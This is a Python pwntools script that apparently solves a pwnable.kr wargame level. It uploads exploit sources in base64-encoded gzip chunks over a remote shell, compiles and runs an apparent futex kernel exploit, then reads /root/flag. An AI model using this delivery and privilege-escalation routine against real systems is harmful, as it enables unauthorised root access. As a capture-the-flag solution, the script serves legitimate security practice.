from pwn import *
import gzip

SOURCES = ["exploit.c", "futex.c", "futex.h", "kernel.c", "kernel.h"]
PROMPT = b"/ $ "


def sh(io, cmd):
    io.sendline(cmd)
    return io.recvuntil(PROMPT, drop=True)


def main():
    io = remote("pwnable.kr", 10052)
    io.recvuntil(PROMPT)
    sleep(1)
    sh(io, b"stty -echo")

    for name in SOURCES:
        dst = b"/tmp/" + name.encode()
        sh(io, b"rm -f " + dst)
        data = open(name, "rb").read()
        for i in range(0, len(data), 400):
            blob = b64e(gzip.compress(data[i:i + 400])).encode()
            sh(io, b'echo -n "' + blob + b'" | base64 -d | gzip -d >> ' + dst)
        log.info("sent " + name)

    srcs = b" ".join(b"/tmp/" + s.encode() for s in SOURCES if s.endswith(".c"))
    err = sh(io, b"gcc -std=gnu99 -pthread -I/tmp -o /tmp/exploit " + srcs)
    if err.strip():
        log.error(err.decode(errors="replace"))

    sh(io, b"chmod +x /tmp/exploit")
    io.sendline(b"/tmp/exploit")
    io.sendline(b"cat /root/flag")

    while True:
        line = io.recvline()
        if line.startswith(b"/ #"):
            break
        sys.stderr.write(line.rstrip(b"\r\n").decode(errors="replace") + "\n")
        sys.stderr.flush()

    flag = line[3:].decode(errors="replace").strip()
    log.success("flag: " + flag)


if __name__ == "__main__":
    main()
